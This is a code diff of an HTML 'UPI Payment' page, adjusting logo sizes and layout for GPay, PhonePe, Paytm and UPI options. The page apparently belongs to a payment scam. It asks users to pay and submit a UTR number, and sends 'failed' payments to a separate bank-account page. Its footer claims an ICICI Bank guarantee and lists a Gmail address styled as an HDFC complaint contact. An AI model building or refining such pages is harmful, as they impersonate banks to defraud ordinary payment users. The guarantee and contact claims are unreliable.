@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>UPI Payment</title>
   <link rel="stylesheet" href="styles.css">
   <!-- Font and Icon Libraries -->
@@ -24,39 +24,22 @@
         
       <label class="section-title">↓ Select payment method and pay ↓</label> 
       <div class="payment-options"> <hr>
-      <label><input type="radio" name="payment-method" value="gpay"> <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"width="63px" height="30px" style="vertical-align:middle"> </label> <hr>
+      <label><input type="radio" name="payment-method" value="gpay"> <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"width="43px" height="20px" style="vertical-align:middle"> </label> <hr>
               <tr>
-        <label><input type="radio" name="payment-method" value="phonepe"> <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="99px" height="30px" style="vertical-align:middle"> </label> <hr>
+        <label><input type="radio" name="payment-method" value="phonepe"> <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="79px" height="25px" style="vertical-align:middle"> </label> <hr>
             <tr>
-        <label><input type="radio" name="payment-method" value="paytm"> <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="96px" height="30px" style="vertical-align:middle"> </label> <hr>
+        <label><input type="radio" name="payment-method" value="paytm"> <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="76px" height="20px" style="vertical-align:middle"> </label> <hr>
               <tr>
-        <label><input type="radio" name="payment-method" value="upi"> <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="84px" height="30px" style="vertical-align:middle"> </label> <hr> </hr>
+        <label><input type="radio" name="payment-method" value="upi"> <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="64px" height="20px" style="vertical-align:middle"> </label> <hr> </hr>
         </div>
-      <p class="utr-instruction">↓ Fill the UTR numbers after you done payment ↓</p>
-   UTR<input type="text" id="utr" placeholder="Input UTR number">
+      <p class="utr-instruction">↓ Fill the UTR numbers after you done payment ↓</p> 
+      
+   <br>U T R<input type="text" id="utr" placeholder="Input UTR number"><hr>
 
       <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
-      <button class="error-btn" onclick="window.location.href='bank.html'">Payment failed! Please try using a bank account</button></button> 
-      </div>
-      
-      <div class="van-row van-row--justify-center"style="margin-top: 42px;">
-              <div class="1-image" style="width: 5px; height: 0px; overflow: hidden; border-radius: 8px;">
-                <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"class="van-image__img">
-              </div>
-              <div class="1-image" style="width: 30px; height: 30px; overflow: hidden; border-radius: 8px;">
-                <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881"class="van-image__img">
-              </div>
-              <div class="1-image" style="width: 30px; height: 30px; overflow: hidden; border-radius: 8px;">
-                <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888"class="van-image__img">
-                <!---->
-                <!---->
-              <div class="1-image" style="width: 60px; height: 30px; overflow:hidden; border-radius: 8px;">
-                <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" class="van-image__img">
-      
-    <div>
-      <center>
-        <h6 style="color: lightgray; font-size: 8px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6> </center>
-<center> <h6 style= "color:blue;font-size:7px;"> hdfcbankcomplaintacceptance@gmail.com </center>
+      <button class="error-btn" onclick="window.location.href='bank.html'">Payment failed! Please try using a bank account</button>
+      <left>
+        <h6 style="color: lightgray; font-size: 12px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6> </left> <center> <h6 style= "color:blue;font-size:10px;"> hdfcbankcomplaintacceptance@gmail.com </center>
         </h6>
           </div>
   <!-- Notification Popup -->
